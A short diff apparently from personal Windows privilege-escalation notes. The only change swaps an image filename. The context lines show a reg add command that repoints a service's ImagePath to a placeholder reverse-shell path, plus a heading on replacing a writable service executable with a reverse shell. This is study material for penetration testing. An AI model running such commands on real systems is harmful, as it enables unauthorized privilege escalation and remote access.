@@ -89,7 +89,7 @@ Very good writeup on unquoted service paths
   * **Changing the registry key (may not be this exact key)**
     * **reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v/ ImagePath /t REG\_EXPAND\_SZ /d \<path to reverse shell> /f**
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../.gitbook/assets/image (22) (1).png>)
 
 ### _**Insecure Service Executables** (original service executable modifiable by our user, replace with our reverse shell)_
 
